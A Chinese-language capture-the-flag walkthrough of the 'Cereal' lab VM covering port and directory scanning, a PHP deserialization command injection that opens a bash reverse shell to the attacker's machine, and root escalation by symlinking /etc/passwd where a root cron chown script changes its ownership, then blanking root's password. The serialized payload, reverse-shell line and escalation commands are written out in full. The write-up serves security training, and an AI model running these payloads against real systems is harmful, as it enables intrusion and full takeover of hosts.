```
└─# nmap -sV -p- -A 192.168.0.104
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-01 01:48 EST
Nmap scan report for 192.168.0.104 (192.168.0.104)
Host is up (0.00069s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Apr 12  2021 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 00:24:2b:ae:41:ba:ac:52:d1:5d:4f:ad:00:ce:39:67 (RSA)
|   256 1a:e3:c7:37:52:2e:dc:dd:62:61:03:27:55:1a:86:6f (ECDSA)
|_  256 24:fd:e7:80:89:c5:57:fd:f3:e5:c9:2f:01:e1:6b:30 (ED25519)
80/tcp    open  http       Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 ()
|_http-title: Apache HTTP Server Test Page powered by: Rocky Linux
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.0.102' is not allowed to connect to this MariaDB server
11111/tcp open  tcpwrapped
22222/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
22223/tcp open  tcpwrapped
33333/tcp open  tcpwrapped
33334/tcp open  tcpwrapped
44441/tcp open  http       Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 ()
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
44444/tcp open  tcpwrapped
55551/tcp open  tcpwrapped
55555/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=12/1%Time=63884E5D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.0\.102'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
MAC Address: 00:0C:29:94:4C:C3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

这里看到21端口的ftp服务好像可以匿名登录

### 对21端口：

 使用anonymous账号登录，显示了pub文件夹

```
└─# ftp 192.168.0.104
Connected to 192.168.0.104.
220 (vsFTPd 3.0.3)
Name (192.168.0.104:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Apr 12  2021 pub
226 Directory send OK.
```

下载看看 pub

```
└─# wget -r -np -nH ftp://192.168.0.104/pub
```

ok，啥也没有

### 对80端口：

```
└─# nikto -host 192.168.0.104                                                                               
└─# gobuster dir -u http://192.168.0.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
```

```
+ Server: Apache/2.4.37 ()
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /blog/wp-login.php: Wordpress login found
+ 8725 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-12-01 02:08:18 (GMT-5) (43 seconds)

===============================================================
/.html.bak            (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/blog                 (Status: 301) [Size: 234] [--> http://192.168.0.104/blog/]
/admin                (Status: 301) [Size: 235] [--> http://192.168.0.104/admin/]
/.html                (Status: 403) [Size: 199]
/.html.bak            (Status: 403) [Size: 199]
/phpinfo.php          (Status: 200) [Size: 76260]
```

发现域名   cereal.ctf，于是绑定hosts再访问，可以访问到网页，于是再子域名爆破，web上下文爆破

结果好像一无所获，看看对 cereal.ctf/blog 实现上下文枚举

```
└─# gobuster dir -u http://cereal.ctf/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
```

```
/.html.bak            (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/wp-content           (Status: 301) [Size: 242] [--> http://cereal.ctf/blog/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://cereal.ctf/blog/]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 243] [--> http://cereal.ctf/blog/wp-includes/]
/wp-login.php         (Status: 200) [Size: 7656]
/readme.html          (Status: 200) [Size: 7389]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 240] [--> http://cereal.ctf/blog/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.html.bak            (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://cereal.ctf/blog/wp-login.php?action=register]
```

发现cms是WordPress，有看到一些web目录，有登录啥的一系列功能，接下来优先找WordPress的版本及可能漏洞，再入手功能点

搞了好半天忍不住看wp，发现自己的方向有偏差，信息搜集不够细，再来

发现44441端口也是Apache，那么对这个端口做一次子域名爆破

```
└─# wfuzz -H 'HOST: FUZZ.cereal.ctf:44441' -u 'http://192.168.0.104:44441' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hw 2,45 
000000853:   200        49 L     140 W      1538 Ch     "secure - secure"   
```

再绑定hosts访问secure.cereal.ctf:44441

<img src=".\图片\Snipaste_2022-12-02_11-26-48.png" alt="Snipaste_2022-12-02_11-26-48" style="zoom:80%;" />

看到前端发现这时一个序列化的字符串

| function submit_form() { |                                                              |
| :----------------------: | ------------------------------------------------------------ |
|                          | var object = serialize({ipAddress: document.forms["ipform"].ip.value}); |
|                          | object = object.substr(object.indexOf("{"),object.length);   |
|                          | object = "O:8:\"pingTest\":1:" + object;                     |
|                          | document.forms["ipform"].obj.value = object;                 |
|                          | document.getElementById('ipform').submit();                  |
|                          | }                                                            |

一眼命令执行，试试一些ctf技巧，我们抓包试试

<img src=".\图片\Snipaste_2022-12-02_11-44-00.png" alt="Snipaste_2022-12-02_11-44-00" style="zoom:80%;" />

无结果，可能这里有反序列化漏洞，那么我们的工作就是找源码，啊这个back_en目录是字典扫出来的

```
└─# gobuster dir -u http://secure.cereal.ctf:44441/back_en/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
/index.php.bak        (Status: 200) [Size: 1814]
```

找到源码  http://secure.cereal.ctf:44441/back_en/index.php.bak

```
class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();

	}

	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }

}

if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();

echo "<html>........................................
```

分析  明显看命名  filter_var(）就是个过滤函数，$isValid = False时 if 进入 过滤函数，当$isValid = True 时直接 进 ping() 函数，那么明白了，只需把$isValid 改为True 就行了，接下来上payload构造

```
class pingTest {
    public $ipAddress = "127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.0.102/1314 0>&1'";
    public $isValid = True;
    public $output = "";
}
echo serialize(new pingTest());
```

```
O:8:"pingTest":3:{s:9:"ipAddress";s:63:"127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.0.102/1314 0>&1'";s:7:"isValid";b:1;s:6:"output";s:0:"";}
```

<img src=".\图片\Snipaste_2022-12-02_12-26-56.png" alt="Snipaste_2022-12-02_12-26-56" style="zoom:80%;" />

```
┌──(root💀kali)-[~]
└─# nc -lvvp 1314              
listening on [any] 1314 ...
connect to [192.168.0.102] from cereal.ctf [192.168.0.104] 39998
bash: cannot set terminal process group (948): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

Apache的权限

### 提权：

```
bash-4.4$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/cockpit-session
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
```

**polkit-agent-helper-1** cve编号：**CVE-2021-4034**

脚本是  https://github.com/berdav/CVE-2021-4034

这里我们先不用这个CVE，按常规思路，上脚本信息搜集后，发现以root身份执行了 /usr/share/scripts/chown.sh

```
bash-4.4$ cd /usr/share/scripts
cd /usr/share/scripts
bash-4.4$ ls -al
ls -al
total 8
drwxr-xr-x.  2 root root   22 May 29  2021 .
drwxr-xr-x. 98 root root 4096 May 29  2021 ..
-rw-r--r--.  1 root root   45 May 29  2021 chown.sh
```

我们是无法修改chown.sh，如果可以以Apache身份的权限修改chown.sh，我们直接修改调用 /bin/bash 即可，可惜我们只能读

```
bash-4.4$ cat chown.sh
cat chown.sh
chown rocky:apache /home/rocky/public_html/*
```

这里的意思是把/home/rocky/public_html/  底下所有的文件权限切换到 rocky:apache

假如我们可以把 /etc/passwd 软连接到 /home/rocky/public_html/ 目录下，/etc/passwd 就是用户 rocky 用户组 apache 权限了，我们便可以修改root密码或者把密码置空

```
bash-4.4$ ln -s /etc/passwd /home/rocky/public_html/passwd
ln -s /etc/passwd /home/rocky/public_html/passwd
```

软连接后的/etc/passwd权限

```
-rwxrwxr-x.  1 rocky apache   1548 Dec  2 05:47 passwd
```

不方便修改passwd，于是把它传到web目录复制后本地修改，再来覆盖 /etc/passwd

```
bash-4.4$ cp /etc/passwd /var/www/html/blog
```

<img src=".\图片\Snipaste_2022-12-02_13-27-08.png" alt="Snipaste_2022-12-02_13-27-08" style="zoom:80%;" />

把root密码置空，然后覆盖

```
root::0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
libstoragemgmt:x:997:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
cockpit-ws:x:996:992:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:991:User for cockpit-ws instances:/nonexisting:/sbin/nologin
sssd:x:994:990:User for sssd:/:/sbin/nologin
chrony:x:993:989::/var/lib/chrony:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rngd:x:992:988:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
rocky:x:1000:1000::/home/rocky:/bin/bash
nginx:x:991:987:Nginx web server:/var/lib/nginx:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
```

kali开启http服务，让目标机下载修改后的 passwd 然后覆盖  /etc/passwd

```
┌──(root💀kali)-[~]
└─# python3 -m http.server 1911
```

```
bash-4.4$ wget http://192.168.0.102:1911/passwd
bash-4.4$ cp passwd /etc/passwd
```

```
bash-4.4$ su
su
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\图片\Snipaste_2022-12-02_13-55-47.png" alt="Snipaste_2022-12-02_13-55-47" style="zoom:80%;" />

### 总结：

注意改hosts上域名，然后子域名爆破、目录爆破，细心查看端口，可能不止一个web服务端口。这里的44441端口一样是Apache服务，还要对44441端口继续web上下文爆破。字典不好用时要换大的。

php反序列化漏洞一般是白盒审计，一般格式为JSON传输。本靶机容易硬刚ping的命令执行。

提权时，涉及到软连接。这里涉及一个细节，linux是优先从/etc/passwd读密码的，/etc/passwd里没密码用 'x'来占位才会进/etc/shadow。假如我们把/etc/passwd里密码置空或者换个密码，linux是不会在读/ect/shadow的。

有个问题，我这里对/etc/shadow 进行软连接后还是没权限读    

```
ln -s /etc/shadow /home/rocky/public_html/shadow

lrwxrwxrwx  1 apache apache   11 Dec  2 06:07 shadow -> /etc/shadow
```

```
----------   1 rocky apache    944 May 30  2021 shadow
----------.  1 root  root      814 May 29  2021 shadow-
```

